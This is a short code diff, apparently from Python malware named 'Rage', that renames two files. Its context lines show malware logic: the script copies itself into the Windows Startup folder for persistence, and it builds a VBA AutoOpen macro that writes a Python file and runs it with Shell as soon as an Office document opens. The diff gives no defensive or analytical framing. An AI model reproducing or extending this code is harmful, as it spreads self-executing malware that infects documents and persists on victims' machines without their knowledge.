@@ -22,7 +22,7 @@ from shutil import copy
 
 
 
-path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Rage.pyw" % getenv("userprofile")
+path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/rage.pyw" % getenv("userprofile")
 
 
 if not isfile(path):
@@ -247,7 +247,7 @@ while True:
 
     vba =  """
 Sub AutoOpen()
-    myFile = "exploit.py"
+    myFile = "_rage.py"
     Open myFile For Output As #1
     """
         
@@ -262,7 +262,7 @@ Sub AutoOpen()
     """
 
     vba += """Close #1
-    Shell ("python exploit.py")
+    Shell ("python _rage.py")
         
 End Sub"""
     return vba
